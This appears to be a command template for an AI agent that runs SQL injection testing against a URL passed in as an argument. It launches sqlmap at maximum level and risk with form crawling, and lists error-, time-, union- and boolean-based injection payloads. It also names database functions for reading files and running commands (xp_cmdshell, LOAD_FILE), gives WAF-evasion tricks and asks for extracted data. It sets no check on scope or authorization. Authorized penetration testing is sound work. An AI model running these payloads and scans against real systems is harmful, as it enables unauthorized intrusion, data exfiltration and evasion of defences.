---
description: Test for SQL injection vulnerabilities using automated and manual techniques.
---

SQL injection testing on: $ARGUMENTS

## Automated Testing
```bash
# sqlmap with appropriate level/risk
sqlmap -u "$ARGUMENTS" --batch --level=5 --risk=3 --output-dir=/tmp/sqlmap/ --forms --crawl=2

# For POST data
# sqlmap -u "https://target/login" --data="user=admin&pass=test" --batch --level=5
```

## Manual Detection

### Error-based
```
'
"
1 OR 1=1
1' OR '1'='1
1" OR "1"="1
' OR ''='
```

### Time-based Blind
```
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Union-based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' ORDER BY 100--
```

### Boolean-based
```
' AND 1=1--
' AND 1=2--
' AND (SELECT LENGTH(database()))>0--
```

## Database-Specific
- MySQL: `information_schema`, `LOAD_FILE()`, `INTO OUTFILE`
- PostgreSQL: `pg_sleep()`, `pg_read_file()`
- MSSQL: `xp_cmdshell`, `OPENROWSET`
- Oracle: `DBMS_PIPE.RECEIVE_MESSAGE`

## WAF Bypass
- Case variation: `SeLeCt`, `uNiOn`
- Comments: `UN/**/ION SEL/**/ECT`
- Encoding: URL encode, double encode
- Alternative syntax: `EXPLAIN`, `HAVING`, `GROUP BY`

For each finding provide:
- Parameter and payload
- Database type identified
- Extracted data (version, user, databases)
- Impact (data exfil, authentication bypass)
- Severity
